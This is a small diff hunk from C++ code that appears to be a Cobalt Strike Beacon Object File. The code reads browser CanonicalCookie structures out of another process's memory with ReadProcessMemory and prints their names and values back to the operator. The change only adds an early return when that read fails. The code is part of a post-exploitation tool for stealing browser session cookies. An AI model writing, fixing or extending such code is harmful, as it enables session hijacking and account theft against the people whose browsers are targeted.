@@ -92,6 +92,7 @@ extern "C" {
         CanonicalCookie cookie = { 0 };
         if (!ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(Valueaddr), &cookie, sizeof(CanonicalCookie), nullptr)) {
             BeaconPrintf(CALLBACK_ERROR, "Failed to read cookie struct! Error: %i\n", GetLastError());
+            return;
         }
         BeaconFormatPrintf(buffer, "    Name: ");
         ReadString(hProcess, cookie.name, buffer);
